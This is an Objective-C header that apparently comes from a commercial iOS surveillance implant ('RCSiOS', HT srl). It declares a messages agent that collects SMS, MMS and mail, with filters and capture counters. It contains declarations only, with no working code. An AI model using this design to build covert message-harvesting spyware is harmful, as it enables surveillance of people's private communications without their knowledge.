/*
 * RCSiOS - Messages agent
 *
 *
 * Created by Massimo Chiodini on 01/10/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#import "RCSICommon.h"
#import "RCSIAgent.h"

#ifndef __RCSIAgentMessages_h__
#define __RCSIAgentMessages_h__

#import "RCSILogManager.h"


#define ALL_MSG ((long)0)

@interface RCSIAgentMessages : RCSIAgent <Agents>
{
@public
  int  mSMS;
  int  mMMS;
  int  mMail;
  
@private
  NSMutableArray      *mMessageFilters;
  long                mLastRealTimeSMS;
  long                mLastCollectorSMS;
  long                mFirstCollectorSMS;
  long                mLastRealTimeMail;
  long                mLastCollectorMail;
  long                mFirstCollectorMail;
  long                mLastMMS;
}

- (id)initWithConfigData:(NSData*)aData;
- (void)startAgent;
- (BOOL)stopAgent;

@end                                        

#endif